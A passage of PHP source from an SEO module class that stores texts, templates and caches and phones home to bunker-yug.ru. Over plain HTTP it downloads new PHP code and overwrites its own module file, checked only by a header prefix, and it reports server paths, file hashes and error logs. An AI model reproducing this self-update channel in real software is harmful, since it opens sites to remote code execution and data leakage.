				fclose($fh);
			}
		}
	}

// ------------------------------------------------------------------

	function bsmfile($type, $act='get', $prm='', $body=false)
	{
		$subfolder = '';
		$hashfolder = false;
		$base64_e = false;
		$base64_d = false;
		$filepath = $act == 'file' ? true : false;
		$dirpath = $act == 'dir' ? true : false;
		$mkdir = false;
		$set = $act == 'set' ? true : false;
		$get = in_array($act, array('set', 'file', 'dir'))
			? false : true;
		$append = false;

		if ($get) $body = '';

		$folder = $this->droot.$this->module_folder;

		switch ($type) {
			case 'module':
				if ($set) {
					$body = base64_decode($body);
					if (strpos($body, "<?php\n/**\n * seoModule") !== 0) {
						return false;
					}
				}
				$subfolder = '/../';
				$file = $this->module_file;
				break;

			case 'config':
				$hashfolder = true;
				$file = $type.'.txt';
				break;
			case 'config_value':
				$serialize = true;
				$base64_e = true;
				$hashfolder = true;
				$file = 'config.txt';
				break;

			case 'ws_info':
				$serialize = true;
				$base64_e = true;
				$hashfolder = true;
				$file = $type.'.txt';
				break;

			case 'text':
				$subfolder = '/txt/';
				$file = 'txt_'.$prm.'.txt';
				break;
			case 'text_value':
				$serialize = true;
				$base64_e = true;
				$subfolder = '/txt/';
				$file = 'txt_'.$prm.'.txt';
				break;

			case 'txt_cache':
				$serialize = true;
				$base64_e = true;
				$hashfolder = true;
				$subfolder = '/txt_cache/';
				$mkdir = true;
				$file = 'txt_'.$prm.'.txt';
				break;

			case 'txt_info':
				$serialize = true;
				$base64_e = true;
				$hashfolder = true;
				$subfolder = '/txt_info/';
				$file = 'txt_'.$prm.'.txt';
				break;

			case 'style':
				$base64_d = $set ? true : false;
				$hashfolder = true;
				$file = $type.'.css';
				break;

			case 'transit':
				$hashfolder = true;
				$file = $type.'.txt';
				break;
			case 'transit_list':
				$serialize = true;
				$base64_e = true;
				$hashfolder = true;
				$file = 'transit.txt';
				break;

			case 'imgs':
				$subfolder = '/img/';
				break;

			case 'tpl':
				$subfolder = '/tpl/';
				if ($prm) $file = $prm;
				break;

			case 'reverse':
				$serialize = true;
				$base64_e = true;
				$hashfolder = true;
				$file = $type.'.txt';
				break;

			case 'errors':
				$hashfolder = true;
				$file = $type.'.txt';
				break;

			case 'phperrors':
				$hashfolder = true;
				$file = $type.'.txt';
				break;

			case 'db_data':
				$hashfolder = true;
				$file = 'data.db';
				break;

			case 'test':
				$file = $type.$prm.'.txt';
				$append = true;
				if (is_array($body)) $body = serialize($body);
				break;

			default:
				return false;
		}

		if ($hashfolder) $folder .= '/'.$this->domain_h;
		if ($subfolder) $folder .= $subfolder; else $folder .= '/';

		if (
			($dirpath || $filepath)
			&& $mkdir
			&& ! file_exists($folder)
		) {
			mkdir($folder, 0755, true);
		}
		if ($dirpath) return $folder;
		if ($filepath) return $folder.$file;

		if ('module' == $type) {
			$back = $folder.$file.'_'.date('YmdHis');
			$res = copy($folder.$file, $back.'_'.substr(md5($back),0,4));
			if ( ! $res) return false;
		}

		if ('imgs' == $type) {
			if ( ! file_exists($folder)) {
				mkdir($folder, 0755, true);
			}
			$cc    = intval($body['filescount']);
			$files = $body['files'];
			if ( ! $cc) return true;
			for ($k=1; $k<=$cc; $k++) {
				$file = $files['f'.$k];
				$ext  = substr($file['name'], strpos($file['name'],'.'));
				if ($ext != '.jpg' && $ext != '.png') continue;
				$res = move_uploaded_file($file['tmp_name'], $folder.$file['name']);
				if ( ! $res) return false;
			}
			return true;
		}

		if ($set) {
			if ($body === false) {
				if (file_exists($folder.$file)) {
					unlink($folder.$file);
					return true;
				}
			}

			if ( ! file_exists($folder)) {
				mkdir($folder, 0755, true);
			}

			if ($serialize) $body = serialize($body);
			if ($base64_e) $body = base64_encode($body);
			if ($base64_d) $body = base64_decode($body);

			if ($append) {
				if ('test' == $type) $body = "\n---\n\n".$body;
			}

			$fh = fopen($folder.$file, ($append ? 'ab' : 'wb'));
			if ( ! $fh) return false;
			$res = fwrite($fh, $body);
			if ($res === false) return false;
			fclose($fh);

			return true;
		}

		if ($get) {
			if ( ! file_exists($folder.$file)) return false;
			$fh = fopen($folder.$file, 'rb');
			if ( ! $fh) return false;
			while ( ! feof($fh)) $body .= fread($fh, 1024*8);
			fclose($fh);

			if ($base64_e) $body = base64_decode($body);
			if ($serialize) $body = unserialize($body);

			return $body;
		}
	}

	function cache_save($alias)
	{
		$this->seotext['cache'] = time();
		$this->bsmfile('txt_cache', 'set', $alias, $this->seotext);
	}

	function cache_clear()
	{
		$folder = $this->bsmfile('txt_cache', 'dir');
		if ( ! file_exists($folder)) return;
		if ( ! ($open = opendir($folder))) return;
		while ($file = readdir($open)) {
			if ( ! is_file($folder.$file)) continue;
			unlink($folder.$file);
		}
	}

	function send_reverse_request($urgently=false)
	{
		$interval = 60*60*6;
		if ($urgently) $interval = 60*5;

		$data = $this->bsmfile('reverse', 'get');

		if ( ! is_array($data)) {
			$data = array(
				'module' => 0,
				'info'   => 0,
				'config' => 0,
				'style'  => 0,
			);
		}

		if (time() - $data['module'] >= $interval) {
			$update = true;
			$action = 'get_code';
			$type   = 'module';
			$time   = $type;

		} elseif (time() - $data['info'] >= $interval) {
			$update = false;
			$action = 'set';
			$type   = 'info';
			$time   = $type;
			$prms   = array(
				'info' => $this->info_parse()
			);

		} elseif (time() - $data['config'] >= $interval) {
			$update = true;
			$action = 'get_code';
			$type   = 'config';
			$time   = $type;

		} elseif (time() - $data['style'] >= $interval) {
			$update = true;
			$action = 'get_code';
			$type   = 'style';
			$time   = $type;

		} else {
			if (is_array($this->c[3])) {
				foreach ($this->c[3] AS $rowalias => $row) {
					if (time() - $data['text_'.$rowalias] >= $interval) {
						$update = true;
						$action = 'get_code';
						$type   = 'text';
						$alias  = $rowalias;
						$time   = $type.'_'.$alias;
						$prms   = array('alias'=>$alias);
						break;
					}
				}
			}
		}

		if ( ! $action) return true;

		$code = $this->reverse_request($action, $type, false, $prms);

		if ($update && $code) {
			$update_res = $this->bsmfile($type, 'set', $alias, $code);
		}

		$data[$time] = time();

		$this->bsmfile('reverse', 'set', '', $data);

		if ( ! $update) return true;

		if ( ! $code || ! $update_res) return false;

		$this->cache_clear();
		$this->htaccess();

		$this->reverse_request($action, $type, 'ok', $prms);
		return true;
	}

	function reverse_request($a, $b=false, $c=false, $data=false)
	{
		if ( ! $this->curl_ext) return false;
		if (is_array($data)) {
			$data = serialize($data);
		}
		$data = base64_encode($data);
		$a = urlencode($a);
		$ac = $this->accesscode;
		$reqres = $this->request(
			'http://bunker-yug.ru/__buran/seoModule_service.php',
			false, false,
			array(
				'idc'  => $this->c[1]['bunker_id'],
				'ws'   => $this->domain,
				'ac'   => $ac,
				'a'    => $a, 'b' => $b, 'c' => $c,
				'data' => $data,
			)
		);
		if (
			$reqres['res']
			&& $reqres['response']
			&& $reqres['info']['http_code'] == 200
		) {
			return $reqres['response'];
		}
		return false;
	}

	function transit_list_check()
	{
		if ( ! $this->curl_ext) return false;

		if (time()-$_SESSION['buranseomodule']['transit'] < 60) {
			return false;
		}
		$_SESSION['buranseomodule']['transit'] = time();

		$list = $this->bsmfile('transit_list', 'get');
		if ( ! $list || ! is_array($list)) return false;

		$cnt = 0;
		foreach ($list AS $key => $row) {
			if (
				$row['try'] || $row['dt']
				|| ! $row['id'] || ! $row['idc']
				|| ! $row['ws'] || ! $row['url']
			) continue;
			$cnt++;

			$list[$key]['try'] = time();
			$this->bsmfile('transit_list', 'set', '', $list);

			$reqres = $this->request(
				$row['ws'].$row['url'],
				array(
					'nobody' => true,
					'follow' => false,
				)
			);
			$list[$key]['dt']       = time();
			$list[$key]['error']    = $reqres['errno'];
			$list[$key]['httpcode'] = $reqres['info']['http_code'];
			$list[$key]['delay']    = $reqres['info']['total_time'];

			$this->bsmfile('transit_list', 'set', '', $list);

			if ($cnt >= 2) break;
		}
	}

	function request($url, $prms=false, $headers=false, $post=false)
	{
		if ( ! $this->curl_ext) return false;
		$options = array(
			CURLOPT_URL            => $url,
			CURLOPT_HEADERFUNCTION => array(&$this,'request_headers'),
			CURLOPT_RETURNTRANSFER => true,
			CURLOPT_FRESH_CONNECT  => true,
			CURLOPT_TIMEOUT        => 10,
			CURLOPT_FOLLOWLOCATION => true,
			CURLOPT_USERAGENT      => 'Buran/',
		);
		$follow = true;
		if ($prms) {
			foreach ($prms AS $prm => $val) {
				if ($prm == 'nobody') $options[CURLOPT_NOBODY] = $val;

				if ($prm == 'follow') {
					$options[CURLOPT_FOLLOWLOCATION] = $val;
					$follow = $val;
				}
			}
		}
		if ($headers) {
			$options[CURLOPT_HTTPHEADER] = $headers;
		}
		if ($post) {
			$options[CURLOPT_POST] = true;
			$options[CURLOPT_POSTFIELDS] = $post;
		}
		if ($this->c[2]['proxy']) {
			$options[CURLOPT_PROXY] = $this->c[2]['proxy'];
		}
		$this->request_headers(false, false, true);
		$curl = curl_init();
		curl_setopt_array($curl, $options);
		$response = $follow && $this->c[2]['curl_auto_redirect']
			? $this->curl_exec_followlocation($curl, $url)
			: curl_exec($curl);
		$request_info    = curl_getinfo($curl);
		$request_headers = $this->curl_request_headers;
		$errno = curl_errno($curl);
		$error = curl_error($curl);
		curl_close($curl);
		$res_a = array(
			'res'      => $errno ? false : true,
			'errno'    => $errno ? $errno : 0,
			'error'    => $errno ? $error : false,
			'response' => $response,
			'info'     => $request_info,
			'headers'  => $request_headers,
		);
		return $res_a;
	}

	function request_headers($curl, $header_line, $clear=false)
	{
		if ($clear) {
			$this->curl_request_headers = array();
			return;
		}
		$this->curl_request_headers[] = $header_line;
		return strlen($header_line);
	}

	function alist()
	{
		$green = '#16782b';
		$red   = '#b52020';

		$p = '<style>
			.row {display: flex; margin-bottom: 3px;}
			.col1 {flex: 0 0 150px; text-align: right; margin-right: 12px;}
			.col2 {flex: 0 0 auto; margin-right: 5px;}
			.green {color: #16782b;}
			.red {color: #b52020;}
		</style>';

		$p .= '<div class="row"><span class="col1">Module</span><span class="col2">'.$this->module_hash.'</span></div>';

		$p .= '<div class="row"><span class="col1">Domain Hash</span><span class="col2">'.$this->domain_h.'</span></div>';

		$flag = $this->website === $this->c[1]['website'] ? true : false;
		$p .= '<div class="row"><span class="col1">Domain</span><span class="col2 '.($flag?'green':'red').'">'.$this->website.' == '.$this->c[1]['website'].'</span></div>';

		$uname = php_uname();
		$flag = stripos($uname, 'window') !== false ? false : true;
		$p .= '<div class="row"><span class="col1">OS</span><span class="col2 '.($flag?'green':'red').'">'.$uname.'</span></div>';

		$flag = version_compare(PHP_VERSION, '5.4.0', '<') ? false : true;
		$p .= '<div class="row"><span class="col1">PHP Version</span><span class="col2 '.($flag?'green':'red').'">'.PHP_VERSION.'</span></div>';

		$flag = stripos($this->sapi_name, 'apache') !== false ? true : false;
		$p .= '<div class="row"><span class="col1">Type of interface</span><span class="col2 '.($flag?'green':'red').'">'.$this->sapi_name.'</span></div>';

		$flag = extension_loaded('openssl') ? true : false;
		$p .= '<div class="row"><span class="col1">OpenSSL</span><span class="col2 '.($flag?'green':'red').'">'.OPENSSL_VERSION_TEXT.' ['.OPENSSL_VERSION_NUMBER.']</span></div>';

		if ( ! $this->curl_ext) {
			$p .= '<div class="row"><span class="col1">cURL</span><span class="col2 red">&mdash;</span></div>';
		}

		if ( ! $this->libxml_ext) {
			$p .= '<div class="row"><span class="col1">DOMDocument</span><span class="col2 red">&mdash;</span></div>';
		}

		if ( ! $this->sqlite3_ext) {
			$p .= '<div class="row"><span class="col1">SQLite3</span><span class="col2 red">&mdash;</span></div>';
		}

		if ( ! function_exists('ini_get')) {
			$p .= '<div class="row"><span class="col1">ini_get()</span><span class="col2 red">&mdash;</span></div>';
		}

		$disable_functions = @ini_get('disable_functions');
		if ($disable_functions) {
			$disable_functions = ','.str_replace(' ','',$disable_functions).',';
			$funcs = array('rename', 'filetype', 'readdir', 'opendir',
				'file_exists', 'base64_encode', 'ucwords',
				'preg_match', 'curl_exec', 'curl_init', 'time',
				'file_get_contents', 'stream_socket_client',
				'fopen', 'fwrite', 'feof', 'fread',
				'session_start', 'session_id', 'session_name',
				'session_write_close',
				'filectime', 'date', 'rewind',
				'ftruncate', 'fgets', 'fseek', 'filesize', 'md5_file',
				'is_array', 'ini_get', 'function_exists',
				'extension_loaded', 'version_compare', 'php_uname',
				'urlencode', 'serialize', 'unlink', 'unserialize',
				'mkdir', 'move_uploaded_file',
				'md5', 'preg_replace', 'in_array', 'strtotime',
				'addslashes', 'getimagesize', 'each', 'reset',
				'end', 'key', 'preg_match_all', 'array_shift',
				'preg_quote', 'getallheaders', 'header_remove',
				'strcmp', 'header', 'headers_list', 'http_response_code',
				'zlib_encode', 'zlib_decode', 'gzinflate', 'gzencode',
				'ob_start', 'ob_get_clean', 'php_sapi_name', 'parse_url',
				'dirname', 'basename',
				'error_reporting', 'ini_set', 'is_writable', 'is_readable',
				'fileowner', 'filegroup', 'posix_getpwuid', 'posix_getgrgid',
				'fileperms', 'set_error_handler', 'headers_sent', 'copy',
				'class_exists', 'base64_encode', 'base64_decode',
				'htmlspecialchars', 'html_entity_decode',
				'memory_get_peak_usage', 'strip_tags', 'array_walk_recursive',);
			foreach ($funcs AS $func) {
				$flag1 = function_exists($func) ? true : false;
				$flag2 = stripos($disable_functions,','.$func.',') !== false
					? true : false;
				if ( ! $flag1 || $flag2) {
					$p .= '<div class="row">
						<span class="col1">'.$func.'()</span>
						<span class="col2 '.($flag1?'green':'red').'">'.($flag1?'+':'&mdash;').'</span>
						<span class="col2 '.(!$flag2?'green':'red').'">'.(!$flag2?'+':'&mdash;').'</span>
					</div>';
				}
			}
		} elseif ($disable_functions === false) {
			$flag = function_exists('ini_get') ? true : false;
			$p .= '<div class="row"><span class="col1">ini disable_functions</span><span class="col2 red">&mdash;</span></div>';
		}

		if ( ! is_writable($this->droot.'/_buran/') || ! is_readable($this->droot.'/_buran/')) {
			$p .= '<div class="row"><span class="col1 red">&mdash;</span><span class="col2">/_buran/</span></div>';
		}
		$queue[] = $this->module_folder.'/';
		do {
			$nextfolder = array_shift($queue);
			if (
				! is_writable($this->droot.$nextfolder) ||
				! is_readable($this->droot.$nextfolder)
			) {
				$p .= '<div class="row"><span class="col1 red">&mdash;</span><span class="col2">'.$nextfolder.'</span></div>';
			}
			if ( ! ($open = opendir($this->droot.$nextfolder))) continue;
			while ($file = readdir($open)) {
				if (filetype($this->droot.$nextfolder.$file) == 'link'
					|| $file == '.' || $file == '..') continue;
				if (is_dir($this->droot.$nextfolder.$file)) {
					$queue[] = $nextfolder.$file.'/';
					continue;
				}
				if ( ! is_file($this->droot.$nextfolder.$file)) continue;
				if (
					! is_writable($this->droot.$nextfolder.$file) ||
					! is_readable($this->droot.$nextfolder.$file)
				) {
					$nm1 = @fileowner($this->droot.$nextfolder.$file);
					if ($nm1) $nm1 = @posix_getpwuid($nm1);
					$nm2 = @filegroup($this->droot.$nextfolder.$file);
					if ($nm2) $nm2 = @posix_getgrgid($nm2);
					$prm = decoct(fileperms($this->droot.$nextfolder.$file) & 0777);
					$p .= '<div class="row"><span class="col1 red">&mdash;</span><span class="col2">'.$nm1['name'].' | </span><span class="col2">'.$nm2['name'].' | </span><span class="col2">'.$prm.' | </span><span class="col2">'.$nextfolder.$file.'</span></div>';
				}
			}
		} while ($queue[0]);

		$p .= '<br><br><br>';
		return $p;
	}

	function info_parse()
	{
		$files = $this->c[2]['include_files'];
		$files = explode('  ', $files);
		if (is_array($files)) {
			foreach ($files AS $file) {
				$file = trim($file);
				if ( ! $file) continue;
				if ( ! file_exists($this->droot.$file)) {
					$this->log('[05]');
					continue;
				}
				$fh = fopen($this->droot.$file, 'rb');
				if ( ! $fh) {
					$this->log('[05.2]');
					continue;
				}
				$incfiles_hash .= md5_file($this->droot.$file).' : '.$file."\n";
				$code = '';
				while ( ! feof($fh)) $code .= fread($fh, 1024*8);
				fclose($fh);
				if ( ! strpos($code, substr($this->module_folder,1))) {
					$this->log('[06]');
				}
			}
		}

		$hash_1_f = $this->droot.dirname($this->module_folder).'/'.$this->module_file;
		if (file_exists($hash_1_f)) $hash_1 = md5_file($hash_1_f);

		$hash_2_f = $this->droot.'/.htaccess';
		if (file_exists($hash_2_f)) $hash_2 = md5_file($hash_2_f);

		$hash_3_f = $this->bsmfile('config', 'file');
		if (file_exists($hash_3_f)) $hash_3 = md5_file($hash_3_f);

		$res = '[seomoduleversion_'.$this->version.']
[datetime_'.date('d.m.Y, H:i:s').']

[website_'.$this->c[1]['website'].']
[modulehash_'.$hash_1.']
[confighash_'.$hash_3.']
[htaccess_'.$hash_2.']
[droot_'.$this->droot.']'."\n";
		$res .= "\n";

		$res .= '[incfiles_]'."\n";
		$res .= $incfiles_hash;
		$res .= '[_incfiles]'."\n";
		$res .= "\n";

		$res .= '[tpls_]'."\n";
		$tpldir = $this->bsmfile('tpl', 'dir');
		$tpls = glob($tpldir.'*/*.php');
		if ($tpls && is_array($tpls)) {
			foreach ($tpls AS $row) {
				$dir = dirname($row);
				$dir = substr($dir,strrpos($dir,'/')+1);
				$dir = preg_replace("/[^a-z0-9\-]/",'',$dir);
				$file = basename($row, '.php');
				$file = preg_replace("/[^a-z0-9\-]/",'',$file);
				if ('index' == $file) $file = ''; else $file = '--'.$file;
				$res .= md5_file($row).' : '.$dir.$file."\n";
			}
		}
		$res .= '[_tpls]'."\n";
		$res .= "\n";

		$res .= '[pages_]'."\n";
		if (is_array($this->c[3])) {
			foreach ($this->c[3] AS $alias => $row) {
				$text = $this->seofile($alias);
				$info = $this->bsmfile('txt_info', 'get', $alias);
				$hash = '';
				if ($text) $hash = md5_file($text['file']);
				$res .= $hash.' : '.$alias.' : '.$info['type'].' : '.$info['last'].' : '.$info['interval'].' : '.$info['seotext_exists'].' : '.$info['seotext_js']."\n";
			}
		}
		$res .= '[_pages]'."\n";
		$res .= "\n";

		$res .= '[errors_]'."\n";
		$file = $this->bsmfile('errors', 'file');
		if (file_exists($file)) {
			$fh = fopen($file,'rb');
			if ($fh) {
				$content = '';
				while ( ! feof($fh)) $content .= fread($fh, 1024*8);
				fclose($fh);
				$res .= $content;
			}
		}
		$res .= '[_errors]'."\n";
		$res .= "\n";
		$res .= "[errinfo_]\n[01] Основная ошибка запуска модуля\n[02] Нет файла контрольной суммы\n[03] Нет файла конфигурации или неверного формата\n[04] Не удалось включить буферизацию вывода\n[05] Файл с подключением модуля не прочитан\n[06] Модуль не подключен в файл\n[07] Команда деактивации модуля\n[08] Модуль отключен по этому пути\n[10] Файл с текстом не прочитан или неверного формата\n[12] В блоке статей не хватает записей\n[13] Несколько статей на одной странице\n[14] Страница стала S\n[15] Страница стала A\n[20] Другой код ответа (200, 404)\n[21] Нет кода страницы\n[22] Заголовки уже отправлены\n[23] Шаблон не определен\n[24] Итоговый ответ не 200\n[25] Нет Html Head Body\n[31] Файл шаблона не записан\n[41] S-страница без текста\n[42] Тег не задан\n[43] Тег не найден\n[50] Много H1\n[51] Meta Robots\n[61] Проблема с Meta\n[62] Проблема с Base\n[64] Проблема с Canonical\n[70] Head или Body не добавлен\n[_errinfo]\n";

		if (isset($_GET['phperrors'])) {
			$data = $this->bsmfile('phperrors');
			$res .= "\n";
			$res .= '[phperrors_]'."\n";
			$res .= $data;
			$res .= '[_phperrors]'."\n";
		}
		return $res;
	}

	function log($text, $description=false, $type='errors', $clear=false)
	{
		if ($this->c[2]['ignore_errors'] && $type == 'errors' && ! $clear) {
			$foo = str_replace(array('[',']'), '', $text);
			if (stripos(','.$this->c[2]['ignore_errors'].',', ','.$foo.',') !== false) {
				return;
			}
		}
		$fh = $this->logs_files[$type];
		if ( ! $fh) {
			$dir = $this->bsmfile('errors', 'dir');
			if ( ! file_exists($dir)) return false;
			$file = $this->bsmfile('errors', 'file');
			if ($clear) {
				$fh = fopen($file, 'wb');
				if ($fh) {
					$data = time() ."\t";
					$data .= date('Y-m-d-H-i-s') ."\t";
					$data .= '(truncate)' ."\n";
					fwrite($fh, $data."\n");
					fclose($fh);
				}
				return true;
			}
			if (file_exists($file) && filesize($file) >= 1024*64) {
				$fh = fopen($file, 'c+b');
				if ($fh) {
					fseek($fh,-1024*8,SEEK_END);
					$data = '';
					while ($line = fgets($fh)) $data .= $line;
					$data .= time() ."\t";
					$data .= date('Y-m-d-H-i-s') ."\t";
					$data .= '(truncated)' ."\n";
					ftruncate($fh, 0);
					rewind($fh);
					fwrite($fh, $data."\n");
					fclose($fh);
				}
			}
			$fh = fopen($file, 'ab');
			if ( ! $fh) return false;
			$this->logs_files[$type] = $fh;
		}
		if ($text) {
			$data = time() ."\t";
			$data .= date('Y-m-d-H-i-s') ."\t";
			$data .= $text ."\t";
			$data .= $this->requesturi;
			if ($description) {
				$data .= "\t". $description;
			}
			fwrite($fh, $data."\n");
		}
	}

	function error_handler($errno, $errstr, $errfile, $errline)
	{
		$file = $this->bsmfile('phperrors','file');
		$fh = fopen($file, 'ab');
		if ( ! $fh) return false;
		$line = date('d.m.Y, H:i:s').' [errno '.$errno.'] '.$errstr.' in '.$errfile.' [line '.$errline.']';
		fwrite($fh, $line."\n\n");
		return false;
	}

	function filetime($file, $type='c')
	{
		if ( ! file_exists($file)) return false;
		switch ($type) {
			case 'a': $time = fileatime($file); break;
			case 'm': $time = filemtime($file); break;
			default: $time = filectime($file);
		}
		return $time ? $time : false;
	}

	function htaccess()
	{
		$htaccess = '
<IfModule mod_rewrite.c>
	RewriteEngine On
	RewriteBase /
	RewriteCond %{REQUEST_URI} \.txt$
	RewriteRule . - [R=404,L,NC]
	RewriteRule \.txt$ /index.php [L,QSA]
</IfModule>
';
		$fh = fopen($this->droot.$this->module_folder.'/.htaccess','wb');
		if ( ! $fh) return;
		fwrite($fh, $htaccess);
		fclose($fh);
	}

	function auth($get_w)
	{
		$sessid = session_id();
		if ( ! $sessid) session_start();
		if (time() - $_SESSION['buranseomodule']['auth'][$get_w] < 60*30) {
			return true;
		}
		$http  = 'http://';
		$host  = 'bunker-yug.ru';
		$url   = '/__buran/secret_key.php';
		$url  .= '?h='.$this->domain;
		$url  .= '&w='.$get_w;

		if ($this->curl_ext) {
			$options = array(
				CURLOPT_URL => $http.$host.$url,
				CURLOPT_RETURNTRANSFER => true,
			);
			$curl = curl_init();
			curl_setopt_array($curl, $options);
			$ww = curl_exec($curl);
			$curl_errno = curl_errno($curl);
			curl_close($curl);
		}
		if ($curl_errno && $this->sock_ext) {
			$headers = "GET ".$url." HTTP/1.0\nHost: {$host}\n\n";
			$res = stream_socket_client($host.':80', $errno, $errstr, 10);
			if ($res) {
				fwrite($res, $headers);
				while ( ! feof($res)) {
					$ww .= fread($res, 1024*1024); 
				}
				fclose($res);
				$ww = $this->parse_response_headers($ww);
				$ww = $ww[1];
			}
		}
		if ( ! $ww && $this->fgc_ext) {
			$ww = file_get_contents($http.$host.$url);
		}
		if ($ww && $get_w && $ww === $get_w) {
			$_SESSION['buranseomodule']['auth'][$get_w] = time();
			return true;
		}
		unset($_SESSION['buranseomodule']);
		return false;
	}

	function parse_response_headers($data)
	{
		$data = str_replace("\r", '', $data);
		$data = explode("\n\n", $data, 2);
		return $data;
	}

	function curl_exec_followlocation(&$curl, &$url)
	{
		/**
		 * curl_exec_followlocation()
		 * @version 2.3
		 * @date 18.01.2019
		 */
		if (preg_match("/^(http(s){0,1}:\/\/[a-z0-9\.-]+)(.*)$/i",
			$url, $matches) !==1) {
			return;
		}
		$website = $matches[1];
		do {
			$this->request_headers(false, false, true);
			// if($referer) curl_setopt($curl, CURLOPT_REFERER, $referer);
			curl_setopt($curl, CURLOPT_URL, $url);
			curl_setopt($curl, CURLOPT_HEADERFUNCTION, array(&$this,'request_headers'));
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			$response = curl_exec($curl);
			$headers  = implode("\n", $this->curl_request_headers);
			if (curl_errno($curl)) return false;
			if (preg_match("/^location: (.*)$/im", $headers, $matches) === 1) {
				$location = true;
				$referer  = $url;
				$url      = trim($matches[1]);
				if (preg_match("/^http(s){0,1}:\/\/[a-z0-9\.-]+/i",
					$url, $matches) !== 1) {
					$url = $website.(substr($url,0,1)!='/'?'/':'').$url;
				}
			} else {
				$location = false;
			}
			if ($location) {
				if ($redirects_list[$url] <= 1) $redirects_list[$url]++;
				else $location = false;
			}
		} while ($location);
		return $response;
	}

	//https://github.com/ralouphie/getallheaders
	function getallheaders_bsm()
	{
		$headers = array();
		$copy_server = array(
			'CONTENT_TYPE'   => 'Content-Type',
			'CONTENT_LENGTH' => 'Content-Length',
			'CONTENT_MD5'    => 'Content-Md5',
		);
		foreach ($_SERVER as $key => $value) {
			if (substr($key, 0, 5) === 'HTTP_') {
				$key = substr($key, 5);
				if (!isset($copy_server[$key]) || !isset($_SERVER[$key])) {
					$key = str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', $key))));
					$headers[$key] = $value;
				}
			} elseif (isset($copy_server[$key])) {
				$headers[$copy_server[$key]] = $value;
			}
		}
		if (!isset($headers['Authorization'])) {
			if (isset($_SERVER['REDIRECT_HTTP_AUTHORIZATION'])) {
				$headers['Authorization'] = $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];
			} elseif (isset($_SERVER['PHP_AUTH_USER'])) {
				$basic_pass = isset($_SERVER['PHP_AUTH_PW'])
					? $_SERVER['PHP_AUTH_PW'] : '';
				$headers['Authorization'] = 'Basic ' . base64_encode($_SERVER['PHP_AUTH_USER'] . ':' . $basic_pass);
			} elseif (isset($_SERVER['PHP_AUTH_DIGEST'])) {
				$headers['Authorization'] = $_SERVER['PHP_AUTH_DIGEST'];
			}
		}
		return $headers;
	}

	function bsm_fdate($t, $f=false, $d=false, $k=false)
	{
		if ( ! $f) $f = 'd.m.Y';
		if ( ! $d) $d = time();
		$datef_t = $this->charset['fdate'][$t];
		$date = date($f,$d);
		if ( ! isset($datef_t)) {
			return $date;
		}
		if ($k) return $datef_t[$k];
		return $datef_t[$date];
	}

	function bsm_sqlite($close=false)
	{
		if ( ! $this->sqlite3_ext) {
			$this->db_ok = $this->db_op = false;
			return false;
		}

		$dbfile = $this->droot.$this->module_folder.'/'.$this->domain_h.'/data.db';
		$this->db_file = $dbfile;
		$dbfile_ext = file_exists($dbfile);

		if (
			$close
			&& $this->db_op
			&& $this->db
			&& ($this->db instanceof SQLite3)
		) {
			$this->db->close();
			$this->db_op = false;
			return true;
		}

		if ($dbfile_ext) {

			$this->db = new SQLite3($dbfile);
			$res = $this->db->querySingle("SELECT id FROM bots LIMIT 1");
			$this->db_ok = $res !== false && ! $this->db->lastErrorCode() ? true : false;
			$this->db_op = $this->db_ok;

			$dbfiletm = $this->filetime($dbfile);
			if ( ! $this->db_op && time() - $dbfiletm > 60) {
				/*$fh = fopen($this->db_file.'.log', 'ab');
				if ($fh) {
					$log = $this->mct_start.' | '.$this->requesturi.' | id='.$res.' | er='.$this->db->lastErrorCode().' | ert='.$this->db->lastErrorMsg()."\n";
					$res = fwrite($fh, $log);
					fclose($fh);
				}*/
				unlink($dbfile);
			}
		}

		if ( ! file_exists($dbfile)) {
			$this->db = new SQLite3($dbfile);
			$this->db_ok = ! $this->db->lastErrorCode() ? true : false;
			$this->db_op = $this->db_ok;

			if ($this->db_op) {
				$this->db->exec("BEGIN TRANSACTION");
				$this->db->exec("CREATE TABLE 'url' (
					'id' INTEGER PRIMARY KEY AUTOINCREMENT,
					'url' TEXT,
					'resp_code' INTEGER,
					'h1' TEXT,
					'm_titl' TEXT,
					'm_desc' TEXT,
					'm_keyw' TEXT,
					'm_cancl' TEXT,
					'size' REAL,
					'loadtime' REAL,
					'memory' REAL,
					'freq' INTEGER,
					'lastload' INTEGER
				)");
				$this->db->exec("CREATE TABLE 'url_refr' (
					'id' INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
					'url' TEXT,
					'referer' TEXT,
					'freq' INTEGER,
					'lastload' INTEGER
				)");
				$this->db->exec("CREATE TABLE 'bots' (
					'id' INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
					'day' TEXT,
					'bot' TEXT,
					'ip' INTEGER,
					'cnt' INTEGER
				)");
				$this->db->exec("CREATE UNIQUE INDEX 'ind_url' ON 'url' ('url')");
				$this->db->exec("CREATE UNIQUE INDEX 'ind_url_referer' ON 'url_refr' ('url', 'referer')");
				$this->db->exec("CREATE UNIQUE INDEX 'ind_day_bot_ip' ON 'bots' ('day', 'bot', 'ip')");
				$res = $this->db->exec("COMMIT");

				$this->db_ok = $res !== false && ! $this->db->lastErrorCode() ? true : false;
				$this->db_op = $this->db_ok;
			}
		}

		return $this->db_ok;
	}

	function upgrade()
	{
		$folder = $this->droot.$this->module_folder;

		if ( ! file_exists($folder.'/'.$this->domain_h.'/')) {
			$res = mkdir($folder.'/'.$this->domain_h.'/', 0755, true);
			if ($res !== true) {
				$errors = true;
				print 'hash folder'."\n";
			}
		}
		if (file_exists($folder.'/t/')) {
			$res = rename($folder.'/t/', $folder.'/txt/');
			if ($res !== true) {
				$errors = true;
				print 'text folder'."\n";
			}
		}
		if (file_exists($folder.'/i/')) {
			$res = rename($folder.'/i/', $folder.'/img/');
			if ($res !== true) {
				$errors = true;
				print 'imgs folder'."\n";
			}
		}
		if ( ! file_exists($folder.'/transit.txt') &&
			file_exists($folder.'/transit_'.$this->domain_h.'.txt')) {
			$res = rename($folder.'/transit_'.$this->domain_h.'.txt',
				$folder.'/transit.txt');
			if ($res !== true) {
				$errors = true;
				print 'transit file'."\n";
			}
		}
		if ( ! file_exists($folder.'/'.$this->domain_h.'/config.txt') &&
			file_exists($folder.'/config_'.$this->domain_h.'.txt')) {
			$res = rename($folder.'/config_'.$this->domain_h.'.txt',
				$folder.'/'.$this->domain_h.'/config.txt');
			if ($res !== true) {
				$errors = true;
				print 'config file'."\n";
			}
		}
		if ( ! file_exists($folder.'/'.$this->domain_h.'/head.txt') &&
